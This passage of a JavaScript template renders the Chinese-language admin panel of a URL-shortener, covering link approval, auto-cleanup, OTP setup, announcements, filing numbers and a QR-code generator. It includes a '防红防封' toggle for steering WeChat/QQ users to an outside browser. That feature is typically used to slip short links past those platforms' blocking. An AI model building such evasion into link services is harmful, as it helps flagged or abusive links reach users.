onchange="document.getElementById('pendingCleanDaysWrapper').style.display=this.checked?'inline-flex':'none'"><label style="margin:0;font-weight:bold;color:#111827">开启待审核申请自动拒绝</label></div><div id="pendingCleanDaysWrapper" style="display:none;align-items:center;gap:8px;margin-bottom:15px;background:#f9fafb;padding:10px;border-radius:6px;border:1px solid #e5e7eb;flex-wrap:wrap"><span style="font-size:14px;color:#374151">待审核超过：</span><input type="number" id="cfgPendingCleanDays" value="30" min="1" max="3650" style="width:80px;padding:6px;text-align:center;border:1px solid #d1d5db;border-radius:4px;outline:none"><span style="font-size:14px;color:#374151">天后自动拒绝并删除</span></div><button class="btn" style="margin-top:15px;width:auto" onclick="saveCleanConfig()">保存清理设置</button><hr style="margin:24px 0;border:none;border-top:1px solid #d1d5db;"><h3 style="margin:top:0">前台访问密码</h3><div class="form-group" style="display:flex;align-items:center;gap:8px;margin-top:15px;flex-wrap:wrap"><input type="checkbox" id="cfgFrontPwdEnable" style="width:auto" onchange="document.getElementById('frontPwdWrapper').style.display=this.checked?'block':'none'"><label style="margin:0;font-weight:bold;color:#111827">开启前台访问密码</label></div><div id="frontPwdWrapper" style="display:none;margin-bottom:15px;background:#f9fafb;padding:15px;border-radius:6px;border:1px solid #e5e7eb;"><div class="form-group"><label>访问密码</label><input type="text" id="cfgFrontPwd" placeholder="设置前台访问密码"></div><button class="btn" style="width:auto" onclick="saveFrontPwdConfig()">独立保存前台密码</button></div><hr style="margin:24px 0;border:none;border-top:1px solid #d1d5db;"><h3 style="margin:top:0">防红防封设置</h3><div class="form-group" style="display:flex;align-items:center;gap:8px;margin-top:15px;flex-wrap:wrap"><input type="checkbox" id="cfgWxQqMask" style="width:auto"><label style="margin:0;font-weight:bold;color:#111827">在微信/QQ内开启浏览器打开引导</label></div><button class="btn" style="width:auto;margin-top:10px" onclick="saveWxQqMaskConfig()">独立保存防红防封设置</button><hr style="margin:24px 0;border:none;border-top:1px solid #d1d5db;"><h3 style="margin:top:0">二次验证 (OTP) 安全加固</h3><div id="otpStatusOn" style="display:none;padding:15px;background:#d1fae5;border:1px solid #059669;border-radius:6px;margin-bottom:15px;max-width:400px;width:100%;box-sizing:border-box;"><span style="color:#065f46;font-weight:bold;">已启用 OTP 二次验证。系统处于高级安全保护中。</span><br><br><button class="btn btn-danger" style="width:auto" onclick="disableOTP()">关闭 OTP 验证</button></div><div id="otpStatusOff" style="display:none;"><button id="btnSetupOtp" class="btn" style="width:auto;background:#059669" onclick="setupOTP()">开启 OTP 二次验证 (推荐)</button><div id="otpSetupPanel" style="display:none;padding:20px;background:#f9fafb;border:1px solid #d1d5db;border-radius:6px;margin-top:15px"><p style="margin-top:0;font-weight:bold;color:#374151">1. 请使用身份验证器(如Google Authenticator)扫描下方二维码：</p><img id="otpQrImg" src="" style="width:150px;height:150px;border:1px solid #d1d5db;border-radius:6px;margin-bottom:10px"><p style="margin-top:0;font-size:14px;color:#6b7280">如果无法扫码，请手动输入密钥：<strong id="otpSecretText" style="color:#111827"></strong></p><p style="font-weight:bold;color:#374151;margin-bottom:10px">2. 输入动态验证码与管理员密码以确认开启：</p><div style="display:flex;gap:10px;margin-bottom:15px"><input type="text" id="otpSetupCode" placeholder="6位动态码" style="width:120px;padding:8px;border:1px solid #d1d5db;border-radius:4px"><input type="password" id="otpSetupPwd" placeholder="当前管理员密码" style="width:180px;padding:8px;border:1px solid #d1d5db;border-radius:4px"></div><button class="btn" style="width:auto" onclick="enableOTP()">验证并启用 OTP</button></div></div></div></div><div id="tab-manage" class="tab-pane"><div class="card"><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px"><h3 style="margin:0">已生效链接</h3><button class="btn btn-danger" onclick="batchDelete()">批量删除所选</button></div><div class="table-responsive"><table><thead><tr><th style="width:50px"><input type="checkbox" id="selectAllManage" onclick="toggleAll(this, '.cb-del')"></th><th>完整短链接</th><th>原长链接</th><th>跳转次数</th><th>通过时间</th><th>操作</th></tr></thead><tbody id="manageTbody"></tbody></table></div></div></div><div id="tab-audit" class="tab-pane"><div class="card"><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px"><h3 style="margin:0">待审核申请</h3><button class="btn btn-danger" onclick="batchReject()">批量拒绝所选</button></div><div class="table-responsive"><table><thead><tr><th style="width:50px"><input type="checkbox" id="selectAllAudit" onclick="toggleAll(this, '.cb-rej')"></th><th>短链接后缀</th><th>长链接目标</th><th>申请时间</th><th>状态</th><th>操作</th></tr></thead><tbody id="auditTbody"></tbody></table></div></div></div><div id="tab-announce" class="tab-pane"><div class="card"><h3>前台公告板设置</h3><div class="form-group" style="display:flex;align-items:center;gap:8px;margin-bottom:15px;flex-wrap:wrap"><input type="checkbox" id="cfgAnnounceEnable" style="width:auto"><label style="margin:0;font-weight:bold;color:#111827">开启前台公告显示</label></div><div class="form-group"><div class="editor-toolbar"><button type="button" onclick="formatDoc('bold')" title="加粗"><b>B</b></button><button type="button" onclick="formatDoc('italic')" title="斜体"><i>I</i></button><span style="color:#d1d5db;margin:0 4px">|</span><button type="button" onclick="formatDoc('justifyLeft')" title="居左">左对齐</button><button type="button" onclick="formatDoc('justifyCenter')" title="居中">居中</button><button type="button" onclick="formatDoc('justifyRight')" title="居右">右对齐</button><span style="color:#d1d5db;margin:0 4px">|</span><button type="button" onclick="addLink()" title="超链接">🔗 链接</button><select onchange="formatDoc('fontSize', this.value); this.selectedIndex=0;" title="字号"><option value="">字号</option><option value="1">极小</option><option value="3">正常</option><option value="5">大号</option><option value="7">特大</option></select><input type="color" onchange="formatDoc('foreColor', this.value)" title="字体颜色" style="padding:0;width:30px;height:28px;border:1px solid #d1d5db;border-radius:4px;cursor:pointer"></div><div id="announceText" contenteditable="true" style="min-height:150px;border:1px solid #d1d5db;border-radius:0 0 6px 6px;padding:12px;outline:none;background:#fff;overflow-y:auto;line-height:1.6"></div></div><button class="btn" onclick="saveAnnounce()" style="max-width:200px">发布公告</button></div></div><div id="tab-beian" class="tab-pane"><div class="card"><h3 style="margin-bottom: 25px;">网站底部合规备案管理</h3><details><summary>添加 ICP 备案</summary><div class="details-content"><div class="form-group"><label>ICP备案号</label><input type="text" id="cfgIcpNum" placeholder="例如：京ICP备12345678号-1"></div><div class="form-group"><label>备案查询地址</label><input type="text" id="cfgIcpLink" placeholder="例如：https://beian.miit.gov.cn/"></div></div></details><details><summary>添加公安网安备案</summary><div class="details-content"><div class="form-group"><label>公安备案号</label><input type="text" id="cfgPsbNum" placeholder="例如：京公网安备 11000002000001号"></div><div class="form-group"><label>备案查询地址</label><input type="text" id="cfgPsbLink" placeholder="例如：http://www.beian.gov.cn/portal/registerSystemInfo"></div></div></details><button class="btn" onclick="saveBeianConfig()" style="max-width:200px;margin-top:10px">保存备案信息</button></div></div></div><div id="qrModal" style="display:none;position:fixed;left:0;top:0;width:100%;height:100%;background:rgba(0,0,0,0.55);z-index:99999;align-items:center;justify-content:center;padding:20px;box-sizing:border-box"><div style="width:100%;max-width:360px;background:#fff;border-radius:12px;padding:24px;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,0.25)"><h3 style="margin:0 0 16px 0;color:#111827">短链接二维码</h3><img id="qrModalImg" src="" style="width:240px;height:240px;background:#fff;border:1px solid #e5e7eb;border-radius:8px;padding:10px;box-sizing:border-box"><div id="qrModalText" style="margin:14px 0 18px 0;color:#2563eb;font-size:14px;word-break:break-all;line-height:1.5"></div><button class="btn" style="width:auto;padding:10px 28px" onclick="closeLinkQr()">关闭</button></div></div><script>function makeQrImg(text){function svg(t){const tables={1:[26,7,1,[]],2:[44,10,1,[6,18]],3:[70,15,1,[6,22]],4:[100,20,1,[6,26]],5:[134,26,1,[6,30]],6:[172,18,2,[6,34]],7:[196,20,2,[6,22,38]],8:[242,24,2,[6,24,42]],9:[292,30,2,[6,26,46]],10:[346,18,4,[6,28,50]]};const enc=new TextEncoder().encode(t);let v=1,cfg=null,dataCodewords=0;for(;v<=10;v++){cfg=tables[v];dataCodewords=cfg[0]-cfg[1]*cfg[2];let cc=v<10?8:16;if(4+cc+enc.length*8<=dataCodewords*8)break}if(v>10)throw new Error('QR内容过长');const totalCodewords=cfg[0],eccLen=cfg[1],numBlocks=cfg[2],aligns=cfg[3],size=17+4*v,ccBits=v<10?8:16;let bits=[];function add(val,len){for(let i=len-1;i>=0;i--)bits.push((val>>>i)&1)}add(4,4);add(enc.length,ccBits);for(const b of enc)add(b,8);let maxBits=dataCodewords*8;let term=Math.min(4,maxBits-bits.length);for(let i=0;i<term;i++)bits.push(0);while(bits.length%8)bits.push(0);let data=[];for(let i=0;i<bits.length;i+=8){let b=0;for(let j=0;j<8;j++)b=(b<<1)|bits[i+j];data.push(b)}for(let p=236;data.length<dataCodewords;p^=253)data.push(p);let exp=new Array(512),log=new Array(256),x=1;for(let i=0;i<255;i++){exp[i]=x;log[x]=i;x<<=1;if(x&256)x^=285}for(let i=255;i<512;i++)exp[i]=exp[i-255];const mul=(a,b)=>a&&b?exp[log[a]+log[b]]:0;let gen=new Array(eccLen).fill(0);gen[eccLen-1]=1;let root=1;for(let i=0;i<eccLen;i++){for(let j=0;j<eccLen;j++){gen[j]=mul(gen[j],root);if(j+1<eccLen)gen[j]^=gen[j+1]}root=mul(root,2)}function ecc(dat){let res=new Array(eccLen).fill(0);for(const b of dat){let factor=b^res.shift();res.push(0);for(let i=0;i<eccLen;i++)res[i]^=mul(gen[i],factor)}return res}let blocks=[],k=0,numShort=numBlocks-totalCodewords%numBlocks,shortLen=Math.floor(totalCodewords/numBlocks);for(let i=0;i<numBlocks;i++){let datLen=shortLen-eccLen+(i<numShort?0:1);let dat=data.slice(k,k+datLen);k+=datLen;blocks.push({dat,ec:ecc(dat)})}let code=[],maxDat=Math.max(...blocks.map(b=>b.dat.length));for(let i=0;i<maxDat;i++)for(const b of blocks)if(i<b.dat.length)code.push(b.dat[i]);for(let i=0;i<eccLen;i++)for(const b of blocks)code.push(b.ec[i]);let m=Array.from({length:size},()=>Array(size).fill(false)),f=Array.from({length:size},()=>Array(size).fill(false));function set(x,y,val,func=true){if(0<=x&&x<size&&0<=y&&y<size){m[y][x]=!!val;if(func)f[y][x]=true}}function finder(cx,cy){for(let dy=-4;dy<=4;dy++)for(let dx=-4;dx<=4;dx++){let d=Math.max(Math.abs(dx),Math.abs(dy));set(cx+dx,cy+dy,d!==2&&d!==4,true)}}finder(3,3);finder(size-4,3);finder(3,size-4);for(let i=0;i<size;i++){if(!f[6][i])set(i,6,i%2===0,true);if(!f[i][6])set(6,i,i%2===0,true)}function align(cx,cy){for(let dy=-2;dy<=2;dy++)for(let dx=-2;dx<=2;dx++)set(cx+dx,cy+dy,Math.max(Math.abs(dx),Math.abs(dy))!==1,true)}for(const y of aligns)for(const x of aligns)if(!((x===6&&y===6)||(x===size-7&&y===6)||(x===6&&y===size-7)))align(x,y);set(8,size-8,true,true);if(v>=7){function verBits(){let rem=v;for(let i=0;i<12;i++)rem=(rem<<1)^(((rem>>>11)&1)*7973);return(v<<12)|rem}let vb=verBits();for(let i=0;i<18;i++){let bit=((vb>>>i)&1)!==0,a=size-11+i%3,b=Math.floor(i/3);set(a,b,bit,true);set(b,a,bit,true)}}function fmtBits(){let data=(1<<3)|0,rem=data;for(let i=0;i<10;i++)rem=(rem<<1)^(((rem>>>9)&1)*1335);return((data<<10)|rem)^21522}let fb=fmtBits();for(let i=0;i<=5;i++)set(8,i,((fb>>>i)&1)!==0,true);set(8,7,((fb>>>6)&1)!==0,true);set(8,8,((fb>>>7)&1)!==0,true);set(7,8,((fb>>>8)&1)!==0,true);for(let i=9;i<15;i++)set(14-i,8,((fb>>>i)&1)!==0,true);for(let i=0;i<8;i++)set(size-1-i,8,((fb>>>i)&1)!==0,true);for(let i=8;i<15;i++)set(8,size-15+i,((fb>>>i)&1)!==0,true);let bitIndex=0;for(let right=size-1;right>=1;right-=2){if(right===6)right--;for(let vert=0;vert<size;vert++){let y=(((right+1)&2)===0)?size-1-vert:vert;for(let x=right;x>=right-1;x--){if(!f[y][x]){let bit=false;if(bitIndex<code.length*8)bit=((code[bitIndex>>>3]>>>(7-(bitIndex&7)))&1)!==0;bitIndex++;if((x+y)%2===0)bit=!bit;m[y][x]=bit}}}}let cell=4,dim=(size+8)*cell,path='';for(let y=0;y<size;y++){let x=0;while(x<size){while(x<size&&!m[y][x])x++;let x0=x;while(x<size&&m[y][x])x++;if(x>x0)path+='M'+((x0+4)*cell)+' '+((y+4)*cell)+'h'+((x-x0)*cell)+'v'+cell+'H'+((x0+4)*cell)+'z'}}return'<svg xmlns="http://www.w3.org/2000/svg" width="'+dim+'" height="'+dim+'" viewBox="0 0 '+dim+' '+dim+'"><rect width="100%" height="100%" fill="#fff"/><path d="'+path+'" fill="#000"/></svg>'}return'data:image/svg+xml;charset=utf-8,'+encodeURIComponent(svg(text))}function escapeHtml(str){if(!str)return'';return String(str).replace(/[&<>'"]/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;',"'":'&#39;','"':'&quot;'}[m]));}function formatBJTime(ts){if(!ts)return'-';return new Date(ts).toLocaleString('zh-CN',{timeZone:'Asia/Shanghai',hour12:false}).replace(/\\//g,'-');}const API_BASE='${path}/api';const HOST='${currentHost}';let allLinks=[];let otpSecretTemp='';function linkQrUrl(short){return window.location.protocol+'//'+HOST+'/'+short;}function linkQrSrc(url){return makeQrImg(url);}function showLinkQr(short){const u=linkQrUrl(short);document.getElementById('qrModalImg').src=linkQrSrc(u);document.getElementById('qrModalText').innerText=u;document.getElementById('qrModal').style.display='flex';}function closeLinkQr(){document.getElementById('qrModal').style.display='none';}function switchTab(id){document.querySelectorAll('.nav-item').forEach(e=>e.classList.remove('active'));document.querySelectorAll('.tab-pane').forEach(e=>e.classList.remove('active'));document.querySelector('[data-tab="'+id+'"]').classList.add('active');document.getElementById('tab-'+id).classList.add('active');if(history.pushState){history.pushState(null,null,'#'+id)}else{window.location.hash='#'+id}}document.addEventListener('DOMContentLoaded',()=>{const hash=window.location.hash.replace('#','')||'basic';switchTab(hash);loadData();});async function loadData(){const r=await fetch(API_BASE+'/data');const d=await r.json();allLinks=d.links;document.getElementById('cfgPath').value=d.config.adminPath;document.getElementById('cfgUser').value=d.config.username;document.getElementById('announceText').innerHTML=d.config.announcement||'';document.getElementById('cfgAudit').checked=d.config.audit_enabled!==undefined?!!d.config.audit_enabled:true;document.getElementById('cfgAutoClean').checked=d.config.auto_clean_enabled===1;document.getElementById('cfgCleanDays').value=d.config.auto_clean_days||30;document.getElementById('cleanDaysWrapper').style.display=d.config.auto_clean_enabled===1?'inline-flex':'none';document.getElementById('cfgPendingAutoClean').checked=d.config.pending_auto_clean_enabled===1;document.getElementById('cfgPendingCleanDays').value=d.config.pending_auto_clean_days||30;document.getElementById('pendingCleanDaysWrapper').style.display=d.config.pending_auto_clean_enabled===1?'inline-flex':'none';document.getElementById('cfgFrontPwdEnable').checked=d.config.frontend_pwd_enabled===1;document.getElementById('cfgFrontPwd').value=d.config.frontend_pwd||'';document.getElementById('frontPwdWrapper').style.display=d.config.frontend_pwd_enabled===1?'block':'none';document.getElementById('cfgWxQqMask').checked=d.config.wx_qq_mask_enabled!==undefined?d.config.wx_qq_mask_enabled===1:true;document.getElementById('cfgAnnounceEnable').checked=d.config.announce_enabled===1;document.getElementById('cfgIcpNum').value=d.config.icp_number||'';document.getElementById('cfgIcpLink').value=d.config.icp_link||'';document.getElementById('cfgPsbNum').value=d.config.psb_number||'';document.getElementById('cfgPsbLink').value=d.config.psb_link||'';if(d.config.otp_enabled===1){document.getElementById('otpStatusOn').style.display='block';document.getElementById('otpStatusOff').style.display='none';}else{document.getElementById('otpStatusOn').style.display='none';document.getElementById('otpStatusOff').style.display='block';document.getElementById('otpSetupPanel').style.display='none';document.getElementById('btnSetupOtp').style.display='inline-block';document.getElementById('otpSetupCode').value='';document.getElementById('otpSetupPwd').value='';}renderTables();}function renderTables(){const mT=document.getElementById('manageTbody');const aT=document.getElementById('auditTbody');mT.innerHTML='';aT.innerHTML='';allLinks.forEach(l=>{const tr=document.createElement('tr');const safeShort=escapeHtml(l.short);const safeLong=escapeHtml(l.longUrl);if(l.status==='approved'){const v=l.visits||0;const permBadge=l.isPermanent?'<span class="badge" style="margin-left:8px">免清理</span>':'';const permBtnTxt=l.isPermanent?'取消免清':'设为免清';const permBtnBg=l.isPermanent?'#f59e0b':'#6b7280';const passTime=formatBJTime(l.approvedAt||l.createdAt);tr.innerHTML='<td><input type="checkbox" class="cb-del" value="'+safeShort+'"></td><td><a href="//'+HOST+'/'+safeShort+'" target="_blank">'+HOST+'/'+safeShort+'</a><button class="btn" style="margin-left:8px;padding:4px 9px;font-size:12px;background:#10b981;color:#fff;width:auto;vertical-align:middle" onclick="showLinkQr(&quot;'+safeShort+'&quot;)">二维码</button>'+permBadge+'</td><td>'+safeLong+'</td><td style="font-weight:bold;color:#2563eb">'+v+'</td><td>'+passTime+'</td><td class="actions"><button class="btn" style="padding:6px 12px;font-size:12px;background:'+permBtnBg+';color:#fff" onclick="doAction(&quot;toggle_permanent&quot;,&quot;'+safeShort+'&quot;)">'+permBtnTxt+'</button><button class="btn btn-danger" style="padding:6px 12px;font-size:12px" onclick="confirmDelete(&quot;'+safeShort+'&quot;)">删除</button></td>';mT.appendChild(tr);}else{tr.innerHTML='<td><input type="checkbox" class="cb-rej" value="'+safeShort+'"></td><td>'+HOST+'/'+safeShort+'</td><td>'+safeLong+'</td><td>'+formatBJTime(l.createdAt)+'</td><td><span class="badge" style="background:#dbeafe;color:#1e40af">待审核</span></td><td class="actions"><button class="btn btn-success" style="padding:6px 12px;font-size:12px" onclick="doAction(&quot;approve&quot;,&quot;'+safeShort+'&quot;)">通过</button><button class="btn btn-danger" style="padding:6px 12px;font-size:12px" onclick="doAction(&quot;reject&quot;,&quot;'+safeShort+'&quot;)">拒绝</button></td>';aT.appendChild(tr);}});}async function doAction(a,s,p={}){await fetch(API_BASE+'/action',{method:'POST',body:JSON.stringify({action:a,payload:{short:s,...p}})});loadData();}function confirmDelete(short){if(confirm('确定要删除这个链接吗？删除后将无法恢复。')){doAction('delete',short);}}async function saveBasicConfig(){const a=document.getElementById('cfgPath').value;const u=document.getElementById('cfgUser').value;const p=document.getElementById('cfgPass').value;const ae=document.getElementById('cfgAudit').checked;await fetch(API_BASE+'/action',{method:'POST',body:JSON.stringify({action:'update_basic_config',payload:{adminPath:a,username:u,password:p,audit_enabled:ae}})});alert('基础信息已保存！如果修改了路径，页面将重新加载。');window.location.href=a;}async function saveCleanConfig(){const autoE=document.getElementById('cfgAutoClean').checked;const autoD=Math.min(3650,Math.max(1,parseInt(document.getElementById('cfgCleanDays').value)||30));const pendingE=document.getElementById('cfgPendingAutoClean').checked;const pendingD=Math.min(3650,Math.max(1,parseInt(document.getElementById('cfgPendingCleanDays').value)||30));const r=await fetch(API_BASE+'/action',{method:'POST',body:JSON.stringify({action:'update_clean_config',payload:{auto_clean_enabled:autoE,auto_clean_days:autoD,pending_auto_clean_enabled:pendingE,pending_auto_clean_days:pendingD}})});const t=await r.text();if(!r.ok)return alert(t||'保存失败');alert('自动清理设置已保存！');}async function saveFrontPwdConfig(){const e=document.getElementById('cfgFrontPwdEnable').checked;const p=document.getElementById('cfgFrontPwd').value.trim();if(e&&!p)return alert('开启前台密码时，密码不能为空');await fetch(API_BASE+'/action',{method:'POST',body:JSON.stringify({action:'update_front_pwd_config',payload:{enabled:e,pwd:p}})});alert('前台密码设置已保存！');}async function saveWxQqMaskConfig(){const e=document.getElementById('cfgWxQqMask').checked;await fetch(API_BASE+'/action',{method:'POST',body:JSON.stringify({action:'update_wx_qq_mask_config',payload:{enabled:e}})});alert('防红防封设置已保存！');}async function saveAnnounce(){const e=document.getElementById('cfgAnnounceEnable').checked;const a=document.getElementById('announceText').innerHTML;await fetch(API_BASE+'/action',{method:'POST',body:JSON.stringify({action:'update_announcement',payload:{enabled:e,announcement:a}})});alert('公告设置已更新！');}async function saveBeianConfig(){const inum=document.getElementById('cfgIcpNum').value.trim();const ilnk=document.getElementById('cfgIcpLink').value.trim();const pnum=document.getElementById('cfgPsbNum').value.trim();const plnk=document.getElementById('cfgPsbLink').value.trim();await fetch(API_BASE+'/action',{method:'POST',body:JSON.stringify({action:'update_beian_config',payload:{icp_number:inum,icp_link:ilnk,psb_number:pnum,psb_link:plnk}})});alert('备案信息已成功保存，已自动应用到底部！');}function toggleAll(s,selector){const c=document.querySelectorAll(selector);for(let i=0;i<c.length;i++)c[i].checked=s.checked;}async function runBatchAction(action,shorts,selectAllId,label){const r=await fetch(API_BASE+'/action',{method:'POST',body:JSON.stringify({action,payload:{shorts}})});const raw=await r.text();let d=null;try{d=raw?JSON.parse(raw):null;}catch(e){}const deleted=d&&Array.isArray(d.deleted)?d.deleted:[];if(deleted.length){const removed=new Set(deleted);allLinks=allLinks.filter(l=>!removed.has(l.short));renderTables();}document.getElementById(selectAllId).checked=false;const failed=d&&Array.isArray(d.failed)?d.failed:[];if(!r.ok||failed.length){const extra=d&&d.error?'：'+d.error:raw&&!d?'：'+raw:'';return alert(label+'成功 '+deleted.length+' 条，失败 '+Math.max(failed.length,shorts.length-deleted.length)+' 条'+extra);}alert(label+'成功 '+deleted.length+' 条');}async function batchDelete(){const c=document.querySelectorAll('.cb-del:checked');const s=Array.from(c).map(cb=>cb.value);if(s.length===0)return alert('请先勾选要删除的链接');if(confirm('确认删除选中的 '+s.length+' 个链接吗？删除后将无法恢复。'))await runBatchAction('batch_delete',s,'selectAllManage','删除');}async function batchReject(){const c=document.querySelectorAll('.cb-rej:checked');const s=Array.from(c).map(cb=>cb.value);if(s.length===0)return alert('请先勾选要拒绝的申请');if(confirm('确认拒绝并删除选中的 '+s.length+' 个申请吗？'))await runBatchAction('batch_reject',s,'selectAllAudit','拒绝');}function formatDoc(cmd,val=null){document.execCommand(cmd,false,val);document.getElementById('announceText').focus();}function addLink(){const url=prompt('输入超链接地址 (包含http/https):','https://');if(url)formatDoc('createLink',url);}async function setupOTP(){const r=await fetch(API_BASE+'/action',{method:'POST',body:JSON.stringify({action:'generate_otp_secret'})});const d=await r.json();otpSecretTemp=d.secret;document.getElementById('otpQrImg').src=makeQrImg('otpauth://totp/ShortLinkAdmin?secret='+otpSecretTemp+'&issuer=EdgeOne');document.getElementById('otpSecretText').innerText=otpSecretTemp;document.getElementById('btnSetupOtp').style.display='none';document.getElementById('otpSetupPanel').style.display='block';}async function enableOTP(){const code=document.getElementById('otpSetupCode').value.trim();const pwd=document.getElementById('otpSetupPwd').value;if(!code||!pwd)return alert('请填写完整验证码与管理员密码');const r=await fetch(API_BASE+'/action',{method:'POST',body:JSON.stringify({action:'enable_otp',payload:{secret:otpSecretTemp,code,password:pwd}})});const t=await r.text();if(r.ok){alert('OTP开启成功！系统现已处于最高级保护。');loadData();}else{alert(t);}}async function disableOTP(){const pwd=prompt('⚠️ 高危操作：\\n请输入当前管理员密码以关闭 OTP 二次验证：');if(!pwd)return;const r=await fetch(API_BASE+'/action',{method:'POST',body:JSON.stringify({action:'disable_otp',payload:{password:pwd}})});const t=await r.text();if(r.ok){alert('OTP已成功关闭。');loadData();}else{alert(t);}}async function logout(){if(!confirm('确定要安全退出登录吗？'))return;await fetch('${path}/logout',{method:'POST'});window.location.reload();}</script></body></html>`;
}